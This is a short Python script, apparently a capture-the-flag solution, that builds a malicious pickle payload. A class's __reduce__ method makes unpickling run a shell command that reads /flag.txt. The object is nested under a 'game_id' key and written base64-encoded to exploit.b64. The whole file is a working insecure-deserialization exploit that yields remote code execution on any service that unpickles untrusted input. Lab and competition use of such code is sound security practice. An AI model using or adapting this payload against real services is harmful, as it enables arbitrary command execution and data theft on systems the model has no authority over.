from base64 import b64encode
from pickle import dumps
from functools import partial
from subprocess import check_output

class RCE(object):
    def __reduce__(self):
        return (partial(check_output, universal_newlines=True), (['cat', '/flag.txt'],))

o = {'game_id': RCE()}
d = dumps(o)
open("exploit.b64", "wb").write(b64encode(d))
